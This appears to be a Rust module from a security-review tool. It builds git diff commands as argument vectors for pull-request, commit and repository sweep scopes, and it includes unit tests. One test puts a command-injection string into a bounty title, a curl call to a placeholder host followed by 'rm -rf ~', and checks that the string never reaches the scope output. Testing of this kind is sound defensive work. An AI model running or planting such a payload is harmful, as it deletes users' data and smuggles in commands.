//! [`TargetScope`], the description of what a sweep covers. `run` writes it
//! into `scope.json`, and the `/sweepky` skill turns it into the plain-words
//! request the playbook expects.
//!
//! One scope per kind, as 01's "Target kinds and how a sweep is scoped" table
//! sets out:
//!
//! | Kind | Scope | `command` |
//! |---|---|---|
//! | `pr` | the three-dot diff `base...head`, from the merge base to `head` | `git diff <mergeBase> <head>` |
//! | `commit` | the commit's own changes | `git diff-tree -p --root <rev>` |
//! | `commit`, a merge | the changes against the first parent | `git diff-tree -p <rev>^1 <rev>` |
//! | `repo` | the tree at `rev`, narrowed to `paths` | none |
//!
//! Every piece of text here, the commands included, is built from the typed
//! target views of `target.rs`, whose values have all passed their checks: a
//! [`RepoName`](crate::RepoName) or [`GitSha`](crate::GitSha) has no spaces,
//! quotes, `;`, `$` or control characters, and a `GitSha` cannot start with
//! `-`. Nothing comes from a bounty's free text, so a hostile bounty cannot
//! add an argument to a git command or words to the skill's request.
//!
//! The commands are argument vectors, one string per argument, never a shell
//! line. Whoever runs one passes it to a process directly (in Rust,
//! `split_first` gives the program for `std::process::Command::new` and the
//! rest for `.args`), so no shell ever reads it and nothing in it is split,
//! quoted or expanded.
//!
//! The CLI adds what only it knows to `scope.json`: the absolute target path,
//! the profile and the agent-instruction files it stripped from the copy.

use serde::{Deserialize, Serialize};

use crate::names::RepoPath;
use crate::target::{CommitTarget, KnownTargetKind, PrTarget, RepoTarget, TargetKind};

/// What a sweep of one target covers, as `scope.json` carries it:
/// `{kind, summary, command?, paths?, notes}`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TargetScope {
    /// The target's kind.
    pub kind: TargetKind,
    /// One sentence saying what to review.
    pub summary: String,
    /// The git command, run inside the fetched target, that prints the diff
    /// to review: one string per argument, never a shell line. `None` when
    /// the scope is a tree rather than a diff.
    // `skip_serializing_if` leaves a `None` out of the JSON rather than
    // writing `null`, and `default` reads a missing key as `None`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command: Option<Vec<String>>,
    /// The paths the review is narrowed to, relative to the target's root;
    /// `None` when it is not narrowed.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub paths: Option<Vec<RepoPath>>,
    /// What else the playbook should know, one sentence each. May be empty.
    pub notes: Vec<String>,
}

/// Whether a commit is a merge, which only the CLI can tell, once it has
/// fetched the commit. A merge needs a different `git` command, see
/// [`CommitTarget::scope`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CommitShape {
    /// A commit with one parent, or a root commit with none.
    Ordinary,
    /// A commit with two or more parents.
    Merge,
}

impl PrTarget {
    /// The scope of a pull request: the diff from the merge base to `head`.
    ///
    /// That is the three-dot diff `base...head`, the one GitHub shows. The
    /// two-dot `base..head` would also show every commit that landed on the
    /// base branch after the pull request left it. The command names the
    /// stored merge base rather than asking git to find it, so it needs only
    /// those two commits, not the history between them.
    pub fn scope(&self) -> TargetScope {
        let (base, head, merge_base) = (self.base(), self.head(), self.merge_base());
        TargetScope {
            kind: KnownTargetKind::Pr.into(),
            summary: format!(
                "Pull request #{number} of {repo}: the three-dot diff {base}...{head}, \
                 from the merge base {merge_base} to the head, as GitHub shows it.",
                number = self.number(),
                repo = self.repo(),
            ),
            command: Some(argv(&["git", "diff", merge_base.as_str(), head.as_str()])),
            paths: None,
            notes: Vec::new(),
        }
    }
}

/// The note a merge commit's scope carries.
const MERGE_NOTE: &str = "This is a merge commit, so the diff is against its first parent: \
     everything the merge brought into the branch it was merged into.";

impl CommitTarget {
    /// The scope of a commit: the changes it made.
    ///
    /// For an ordinary commit, `git diff-tree -p --root <rev>`: `--root`
    /// makes a root commit, which has no parent, show every file it added.
    /// For a merge (`shape` is [`CommitShape::Merge`]), `diff-tree` given
    /// the one commit prints nothing, so the command names the first parent
    /// too, `git diff-tree -p <rev>^1 <rev>`, and a note says the diff is
    /// against it. `run` fetches with depth 2, so the first parent is there.
    // `--diff-merges=first-parent` would give the same diff, but needs git
    // 2.31 or later, and a sweeper's machine may be older (Debian 11 ships
    // 2.30). The two-tree form works on every git.
    pub fn scope(&self, shape: CommitShape) -> TargetScope {
        let rev = self.rev().as_str();
        let repo = self.repo();
        let (summary, command, notes) = match shape {
            CommitShape::Ordinary => (
                format!("Commit {rev} of {repo}: the changes it made."),
                argv(&["git", "diff-tree", "-p", "--root", rev]),
                Vec::new(),
            ),
            CommitShape::Merge => (
                format!("Merge commit {rev} of {repo}: the changes it brought in."),
                // `<rev>^1` is git's name for a commit's first parent.
                argv(&["git", "diff-tree", "-p", &format!("{rev}^1"), rev]),
                vec![MERGE_NOTE.to_owned()],
            ),
        };
        TargetScope {
            kind: KnownTargetKind::Commit.into(),
            summary,
            command: Some(command),
            paths: None,
            notes,
        }
    }
}

/// The note a repository target with no `paths` carries.
const WHOLE_REPO_NOTE: &str = "No paths narrow this target, so the sweep covers the whole \
     repository. A long run can outlast a 5-hour plan window; the quick profile keeps it \
     shorter.";

impl RepoTarget {
    /// The scope of a repository: its tree at `rev`, narrowed to `paths`.
    ///
    /// With no `paths`, the scope is the whole repository, and a note warns
    /// that a long run can outlast a 5-hour plan window.
    pub fn scope(&self) -> TargetScope {
        let (repo, rev) = (self.repo(), self.rev());
        let (summary, notes) = match self.paths() {
            Some(_) => (
                format!("The tree of {repo} at commit {rev}, narrowed to the paths listed."),
                Vec::new(),
            ),
            None => (
                format!("The whole tree of {repo} at commit {rev}."),
                vec![WHOLE_REPO_NOTE.to_owned()],
            ),
        };
        TargetScope {
            kind: KnownTargetKind::Repo.into(),
            summary,
            command: None,
            // `to_vec` copies the borrowed slice into a `Vec` the scope owns,
            // so the scope does not borrow from the target.
            paths: self.paths().map(|paths| paths.to_vec()),
            notes,
        }
    }
}

/// Turns `&str` arguments into the owned `String`s a [`TargetScope`] holds.
fn argv(args: &[&str]) -> Vec<String> {
    args.iter().map(ToString::to_string).collect()
}

#[cfg(test)]
mod tests {
    use serde_json::json;

    use super::{CommitShape, TargetScope, argv};
    use crate::names::RepoPath;
    use crate::target::test_support::{
        BASE, HEAD, MERGE_BASE, REPO, REV, known_commit, known_pr, known_repo, path, sample_commit,
        sample_pr, sample_repo,
    };
    use crate::target::{CommitTarget, KnownTargetKind, PrTarget, RepoTarget, Target};

    /// The `command` a scope should carry.
    fn command(args: &[&str]) -> Option<Vec<String>> {
        Some(argv(args))
    }

    fn pr() -> PrTarget {
        known_pr(&sample_pr())
    }

    fn commit() -> CommitTarget {
        known_commit(&sample_commit())
    }

    fn repo_target(paths: Vec<RepoPath>) -> RepoTarget {
        known_repo(&sample_repo(paths))
    }

    fn mentions_first_parent(scope: &TargetScope) -> bool {
        scope.notes.iter().any(|note| note.contains("first parent"))
    }

    fn warns_of_a_long_run(scope: &TargetScope) -> bool {
        scope
            .notes
            .iter()
            .any(|note| note.contains("whole repository") && note.contains("5-hour plan window"))
    }

    #[test]
    fn a_pr_is_scoped_to_its_three_dot_diff() {
        let scope = pr().scope();
        assert_eq!(scope.kind.as_known(), Some(KnownTargetKind::Pr));
        assert!(
            scope.summary.contains(&format!("{BASE}...{HEAD}")),
            "{}",
            scope.summary
        );
        assert!(scope.summary.contains(REPO), "{}", scope.summary);
        assert!(scope.summary.contains("#42"), "{}", scope.summary);
        // From the stored merge base, not `base`: two-dot `base..head` would
        // add every commit that landed on the base since the branch left it.
        assert_eq!(scope.command, command(&["git", "diff", MERGE_BASE, HEAD]));
        assert_eq!(scope.paths, None);
    }

    #[test]
    fn text_in_a_target_never_reaches_its_scope() {
        // A hostile bounty can put anything in a field this build does not
        // read. The scope is built from the validated fields alone.
        const MARKER: &str = "MARKER-4b1d";
        let mut input = serde_json::to_value(sample_commit()).unwrap();
        input["title"] = json!(format!("{MARKER}; $(curl example.invalid) && rm -rf ~"));
        let target: Target = serde_json::from_value(input).unwrap();
        let commit = known_commit(&target);
        for shape in [CommitShape::Ordinary, CommitShape::Merge] {
            let written = serde_json::to_string(&commit.scope(shape)).unwrap();
            assert!(!written.contains(MARKER), "{written}");
        }
    }

    #[test]
    fn an_ordinary_commit_is_scoped_to_diff_tree_root() {
        let scope = commit().scope(CommitShape::Ordinary);
        assert_eq!(scope.kind.as_known(), Some(KnownTargetKind::Commit));
        assert!(scope.summary.contains(REV), "{}", scope.summary);
        assert!(scope.summary.contains(REPO), "{}", scope.summary);
        // `--root` makes a root commit show every file it added.
        assert_eq!(
            scope.command,
            command(&["git", "diff-tree", "-p", "--root", REV])
        );
        assert!(!mentions_first_parent(&scope), "{:?}", scope.notes);
    }

    #[test]
    fn a_merge_commit_is_scoped_to_its_first_parent_diff() {
        let scope = commit().scope(CommitShape::Merge);
        assert_eq!(scope.kind.as_known(), Some(KnownTargetKind::Commit));
        // `git diff-tree -p --root <merge>` prints nothing, so a merge names
        // both trees.
        let first_parent = format!("{REV}^1");
        assert_eq!(
            scope.command,
            command(&["git", "diff-tree", "-p", &first_parent, REV])
        );
        assert!(mentions_first_parent(&scope), "{:?}", scope.notes);
    }

    #[test]
    fn a_repo_is_scoped_to_its_paths() {
        let paths = vec![path("src/auth/"), path("src/lib.rs")];
        let scope = repo_target(paths.clone()).scope();
        assert_eq!(scope.kind.as_known(), Some(KnownTargetKind::Repo));
        assert!(scope.summary.contains(REPO), "{}", scope.summary);
        assert!(scope.summary.contains(REV), "{}", scope.summary);
        assert_eq!(scope.paths, Some(paths));
        // A tree, not a diff, so there is no command to run.
        assert_eq!(scope.command, None);
        assert!(!warns_of_a_long_run(&scope), "{:?}", scope.notes);
    }

    #[test]
    fn a_scope_round_trips_as_the_json_scope_json_embeds() {
        let scope = repo_target(vec![path("src/auth/"), path("src/lib.rs")]).scope();
        // camelCase keys, and no `command` key when there is no command.
        let written = serde_json::to_value(&scope).unwrap();
        assert_eq!(written["kind"], json!("repo"));
        assert_eq!(written["paths"], json!(["src/auth/", "src/lib.rs"]));
        assert_eq!(written.get("command"), None);
        let read: TargetScope = serde_json::from_value(written).unwrap();
        assert_eq!(read, scope);
    }

    #[test]
    fn a_whole_repo_warns_of_a_long_run() {
        let scope = repo_target(Vec::new()).scope();
        assert_eq!(scope.paths, None);
        assert_eq!(scope.command, None);
        assert!(warns_of_a_long_run(&scope), "{:?}", scope.notes);
        assert_eq!(serde_json::to_value(&scope).unwrap().get("paths"), None);
    }
}
